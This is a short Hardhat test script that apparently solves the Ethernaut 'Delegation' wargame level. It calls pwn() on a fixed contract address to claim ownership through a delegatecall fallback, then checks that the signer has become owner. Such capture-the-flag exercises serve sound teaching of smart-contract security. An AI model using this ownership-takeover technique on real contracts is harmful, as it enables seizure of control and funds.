import { TransactionResponse } from "@ethersproject/providers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Delegation", function () {
  it("Pwn", async function () {
    const ABI = ["function pwn()", "function owner() view returns (address)"];
    const ADDRESS = "0xc8C69aA11D0b8D8E22e21D5b4B6E5f8b7528C91c";
    const contract = await ethers.getContractAt(ABI, ADDRESS);
    const [signer] = await ethers.getSigners();

    console.log("Claiming ownership...");
    const tx: TransactionResponse = await contract.pwn({ gasLimit: 100000 });
    await tx.wait();
    const owner: string = await contract.owner();
    console.log(`owner(): ${owner}`);
    expect(owner).to.equal(signer.address);
  });
});
